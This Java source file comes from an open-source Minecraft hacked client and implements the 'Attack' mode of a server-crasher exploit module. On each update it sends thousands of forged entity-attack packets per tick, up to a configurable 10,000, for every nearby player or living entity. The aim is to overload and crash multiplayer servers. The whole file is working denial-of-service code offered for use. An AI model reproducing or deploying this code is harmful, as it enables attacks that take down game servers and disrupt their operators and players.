/*
 * This file is part of Vandalism - https://github.com/VandalismDevelopment/Vandalism
 * Copyright (C) 2023-2024 NekosAreKawaii, Verschlxfene, FooFieOwO and contributors
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

package de.nekosarekawaii.vandalism.feature.module.impl.exploit.modes.servercrasher;

import de.florianmichael.rclasses.math.integration.MSTimer;
import de.nekosarekawaii.vandalism.Vandalism;
import de.nekosarekawaii.vandalism.base.event.normal.player.PlayerUpdateListener;
import de.nekosarekawaii.vandalism.base.value.impl.number.IntegerValue;
import de.nekosarekawaii.vandalism.base.value.impl.primitive.BooleanValue;
import de.nekosarekawaii.vandalism.feature.module.impl.exploit.ServerCrasherModule;
import de.nekosarekawaii.vandalism.feature.module.template.ModuleMulti;
import net.minecraft.client.network.AbstractClientPlayerEntity;
import net.minecraft.entity.Entity;
import net.minecraft.entity.LivingEntity;
import net.minecraft.network.packet.c2s.play.PlayerInteractEntityC2SPacket;

public class AttackModuleMode extends ModuleMulti<ServerCrasherModule> implements PlayerUpdateListener {

    private final IntegerValue maxPacketsPerTick = new IntegerValue(
            this.getParent(),
            "Max Packets Per Tick",
            "The maximum amount of packets sent per tick.",
            1000,
            500,
            10000
    ).visibleCondition(() -> this.getParent().mode.getValue().equals(this));

    private final IntegerValue delay = new IntegerValue(
            this.getParent(),
            "Delay",
            "The delay between packets.",
            0,
            0,
            2000
    ).visibleCondition(() -> this.getParent().mode.getValue().equals(this));

    private final BooleanValue anyEntity = new BooleanValue(
            this.getParent(),
            "Any Entity",
            "Whether to attack any entity or only players.",
            false
    ).visibleCondition(() -> this.getParent().mode.getValue().equals(this));

    private final MSTimer delayTimer = new MSTimer();

    public AttackModuleMode(final ServerCrasherModule parent) {
        super("Attack", parent);
    }

    @Override
    public void onActivate() {
        Vandalism.getInstance().getEventSystem().subscribe(PlayerUpdateEvent.ID, this);
    }

    @Override
    public void onDeactivate() {
        Vandalism.getInstance().getEventSystem().unsubscribe(PlayerUpdateEvent.ID, this);
    }

    @Override
    public void onPrePlayerUpdate(final PlayerUpdateEvent event) {
        if (this.delayTimer.hasReached(this.delay.getValue(), true)) {
            for (final Entity entity : this.mc.world.getEntities()) {
                if (this.mc.player != entity) {
                    if (entity instanceof AbstractClientPlayerEntity || this.anyEntity.getValue() && entity instanceof LivingEntity) {
                        for (int i = 0; i < this.maxPacketsPerTick.getValue(); i++) {
                            this.mc.getNetworkHandler().getConnection().send(
                                    PlayerInteractEntityC2SPacket.attack(entity, this.mc.player.isSneaking()),
                                    null,
                                    true
                            );
                        }
                    }
                }
            }
        }
    }

}
